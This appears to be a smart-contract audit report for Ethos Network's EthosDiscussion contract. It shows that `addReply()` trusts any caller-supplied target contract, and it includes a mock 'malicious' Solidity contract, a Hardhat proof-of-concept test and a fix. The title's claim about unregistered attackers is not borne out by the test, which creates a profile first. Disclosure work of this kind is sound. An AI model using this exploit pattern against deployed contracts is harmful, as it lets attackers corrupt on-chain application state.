# Attacker can add a `reply` even if not registered and can also reply to an `invalid` target by setting the `targetContract` parameter to a mallicious contract where the checks for `targetContract` will be validated.

### Summary

The lack of validation of `targetContract` parameter in `addReply()` means the user can pass the address of any contract address to it and this address is then passed down to `_checkIfTargetExistsAndAllowed(targetContract, targetId)` which is called in `addReply()`

```solidity 
function _checkIfTargetExistsAndAllowed(address targetContract, uint256 targetId) private view {
    (bool exists, ) = ITargetStatus(targetContract).targetExistsAndAllowedForId(targetId);

    if (!exists) {
      revert TargetNotFound(targetContract, targetId);
    }
  }
```

Now provided the contract passed into `targetContract` follows the `ITargetStatus` interface it will execute successfully, this means the attacker is in complete control of the logic and what the return values will be and can set both return values to true for any `targetId` including 0 and numbers > replyCount which would cause lots of problems since the EthosDescussion contract's core logic heavily relies on no reply having Id of `0` or greater than `replyCount`. 
These `replys` will not belong to any of the ethos contracts(profile/discussion/attestation) but to the mallicious contract which has been set,  hence there will `replys` with to place for them, and unnecessarily increasing the replyCount and causing so many breaks in the contract's logic 

### Root Cause

- The target contract argument in `addReply` isn't checked to make sure it's part of Ethos contracts.

### Internal pre-conditions

-  `isTargetThisContract` needs to be false https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/EthosDiscussion.sol#L115
- No checks on targetContract to verify it's part of the Ethos contracts.

### External pre-conditions

1. The contract which gets passed as the `targetContract` needs to follow the `ITargetStatus` interface 

### Attack Path

1. Attacker sets a malicious contract as `targetContract` instead of one of the ethos contracts 
2. Attacker calls `addReply()`
3. Attacker makes sure the contract's return values are true https://github.com/sherlock-audit/2024-10-ethos-network/blob/main/ethos/packages/contracts/contracts/EthosDiscussion.sol#L300 

### Impact

- Multiple breaks in contract logic.

### PoC

//malicious contract 

```solidity

import "./interfaces/ITargetStatus.sol";

contract MockTargetStatus is ITargetStatus {
    bool private _exists;

    constructor(bool exists) {
        _exists = exists;
    }

    function targetExistsAndAllowedForId(uint256 _targetId) external view override returns (bool exists, bool allowed) {
        return (_exists, _exists); // Assume allowed is always true for simplicity
    }
}

```
//test

```typescript

 it("should successfully add a reply when target contract is NOT a valid Ethos address", async () => {
      const { COMMENTER_0, ethosDiscussion, ethosProfile, OWNER } = await loadFixture(deployFixture);
    
      // Deploy the MockTargetStatus(malicious) contract and capture its address
      const mockTargetStatus = await ethers.deployContract('MockTargetStatus', [true]); // Pass true or false based on your test case
      const mockTargetStatusAddress = await mockTargetStatus.getAddress();
    
      await ethosProfile.connect(OWNER).inviteAddress(COMMENTER_0.address);
      await ethosProfile.connect(COMMENTER_0).createProfile(1);

      const initialReplyCount = await ethosDiscussion.replyCount();
      console.log("Initial Reply Count:", initialReplyCount.toString());
    
      const tx = await ethosDiscussion
        .connect(COMMENTER_0)
        .addReply(mockTargetStatusAddress, 100, defaultReplyContent, defaultReplyMetadata);
    
      // Wait for the transaction to be mined
      await tx.wait();
    
      const newReplyCount = await ethosDiscussion.replyCount();
      console.log("New Reply Count:", newReplyCount.toString());

      
      expect(newReplyCount).to.equal(1); 

    });
```

### This test passes 



### Mitigation

1. Adding a modifier in `addReply()` such as 

```solidity 
 modifier isValidTarget(address targetContract) {
    if (!contractAddressManager.checkIsEthosContract(targetContract)) {
      revert InvalidTargetContract(target);
    }
    _;
  }
//copied from EthosVote.sol
```
